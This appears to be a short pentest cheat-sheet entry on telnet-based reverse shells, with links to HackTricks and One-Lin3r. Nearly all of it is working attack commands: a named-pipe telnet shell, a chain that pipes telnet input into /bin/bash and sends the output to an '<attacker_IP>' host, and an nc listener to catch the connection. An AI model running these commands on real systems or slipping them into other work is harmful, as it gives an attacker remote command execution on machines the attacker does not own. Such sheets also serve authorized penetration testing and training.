# Telnet

```
$ rm -f /tmp/p; mknod /tmp/p p && telnet <IP> <PORT> 0/tmp/p

$ telnet <target_IP> 1234 | /bin/bash | telnet <attacker_IP> 1235

$ nc -lvnp 1235
```

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)